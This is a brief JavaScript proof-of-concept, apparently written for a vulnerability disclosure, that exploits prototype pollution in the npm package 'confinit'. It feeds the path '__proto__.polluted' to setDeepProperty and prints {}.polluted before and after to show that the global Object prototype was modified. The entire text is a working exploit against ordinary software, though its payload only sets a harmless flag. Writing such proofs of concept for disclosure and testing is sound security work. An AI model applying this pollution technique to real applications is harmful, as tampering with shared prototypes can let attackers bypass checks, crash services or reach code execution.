var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const root = require('confinit');
const payload = '__proto__.polluted';
console.log({}.polluted);
root.setDeepProperty(obj, payload, 'yes');
console.log({}.polluted);